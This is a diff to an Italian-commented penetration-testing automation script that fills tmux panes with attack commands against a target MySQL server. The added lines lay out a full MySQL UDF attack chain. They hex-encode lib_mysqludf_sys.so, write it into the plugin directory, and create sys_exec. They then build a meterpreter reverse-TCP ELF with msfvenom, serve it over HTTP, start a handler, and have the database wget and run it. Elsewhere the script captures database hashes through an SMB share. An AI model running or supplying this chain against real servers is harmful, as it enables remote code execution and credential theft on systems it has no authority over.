@@ -201,8 +201,12 @@ else
 	sudo git clone https://github.com/mysqludf/lib_mysqludf_sys.git
 	cd lib_mysqludf_sys/
 	sudo apt update && sudo apt install default-libmysqlclient-dev
-	sudo rm -f lib_mysqludf_sys.so
-	sudo rm -f Makefile
+	#sudo rm -f lib_mysqludf_sys.so
+	#sudo rm -f Makefile
+	#sudo sh -c 'echo "LIBDIR=/usr/lib\ninstall:\n\tgcc -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o \$(LIBDIR)/lib_mysqludf_sys.so" > ./Makefile-mysql'
+	#sudo sh -c 'echo "LIBDIR=/usr/lib\ninstall:\n\tgcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so" > ./Makefile-mariadb'
+
+	
 fi
 
 # kitrunner (analisi API)
@@ -242,7 +246,7 @@ else
 	sudo apt install joomscan
 fi
 
-# juumscan (automatizzo l'analisi delle vulnerabilità di joomla)
+# rlwrap
 printf "\n===================================\n"
 program="rlwrap"
 if is_installed "$program"; then
@@ -2679,7 +2683,6 @@ tmux split-window -h -t "30.9"
 tmux split-window -h -t "30.9"
 tmux split-window -h -t "30.9"
 tmux split-window -h -t "30.9"
-tmux split-window -h -t "30.9"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:30.0 "# Mysql/MariaDB: service fingerprint" Enter
 tmux send-keys -t PT:30.0 "nmap -sV -Pn -vv --script=mysql-* $ip -p 3306 -o out.3306"
@@ -2698,6 +2701,16 @@ tmux send-keys -t PT:30.6 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
 tmux send-keys -t PT:30.7 "# Mysql/MariaDB: get DB user HASH" Enter
 tmux send-keys -t PT:30.7 "sudo impacket-smbserver share ./ -smb2support"
 tmux send-keys -t PT:30.8 "printf \"\n# Activate a SMB Request from remote database\n# mysql> LOAD DATA INFILE '\ \<ATTACKER_IP>\myfile.txt' INTO TABLE my_table;\n\n\" " Enter
+tmux send-keys -t PT:30.9 "# Mysql Reverse Shell: Get Hex value of the plugin that execute data on Mysql" Enter
+tmux send-keys -t PT:30.9 "sudo sh -c 'xxd -p lib_mysqludf_sys.so | tr -d \"\n\" > lib_mysqludf_sys.so.hex'"
+tmux send-keys -t PT:30.10 "printf \"\n# Mysql Reverse Shell: Upload plugin on mysql\n# Get mysql folder which contains plugin\n mysql> select @@plugin_dir\n# Set shell variable to contain hex compiled\n mysql> set @shell = 0x7f454c46020...00000000000000000000;\n# Create plugin file\n mysql> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';\n# Create function which contain my plugin\n mysql> create function sys_exec returns int soname 'udf_sys_exec.so';\n\n\" " Enter
+tmux send-keys -t PT:30.10 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.11 "# Mysql Reverse Shell: Prepare Reverse Shell and make it availble via HTTP" Enter
+tmux send-keys -t PT:30.11 "sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf && sudo cp shell.elf /var/www/html && cd /var/www/html && python3 –m http.server 80"
+tmux send-keys -t PT:30.12 "# Mysql Reverse Shell: Activate listener meterpreter" Enter
+tmux send-keys -t PT:30.12 "sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; exploit -j\""
+tmux send-keys -t PT:30.13 "printf \"\n# Mysql Reverse Shell: Activate meterpreter on remote database\n# Upload meterpreter shell on remote database\n mysql> select sys_exec('wget http://<ATTACKER_IP>/shell.elf');\n mysql> select sys_exec('chmod +x ./shell.elf');\n# Activate Reverse Shell\n mysql> select sys_exec('./shell.elf');\n\n\" " Enter
+tmux send-keys -t PT:30.13 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
 cd $folderProject
 
 # Attivazione della modalità interattiva
